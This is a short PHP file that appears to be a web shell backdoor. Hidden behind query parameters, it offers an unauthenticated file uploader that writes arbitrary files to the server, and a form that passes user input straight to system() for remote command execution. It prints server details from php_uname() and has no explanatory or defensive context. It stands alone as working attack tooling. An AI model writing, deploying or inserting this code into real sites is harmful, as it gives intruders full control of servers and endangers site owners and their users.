?php
if(isset($_GET["up"]))
{
echo "<pre>";
echo "<center><h1>Uploader</h1>";
echo "<font color=#000000>".php_uname()."  ";
echo "<form method=post enctype=multipart/form-data>";
echo "<input type=file name=f><input name=k type=submit id=k value=upload><br>";
if($_POST["k"]==upload)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
echo"<b>".$_FILES["f"]["name"];
}else{
echo"<b>Upload Fail";}}}
echo "</pre>";


if(isset($_REQUEST['cmd'])){
echo "<pre>";
echo "<center><h1>ejecuta</h1>";
echo "<font color=#000000>".php_uname()."  ";
echo "<form name='form' action='#' method='post'>
<input type='text' name='coba'/> <input type='submit' value='enter'/>
</form>";
$envio = ($_POST['coba']);
system($envio);
echo "</pre>";
die;
}

?>
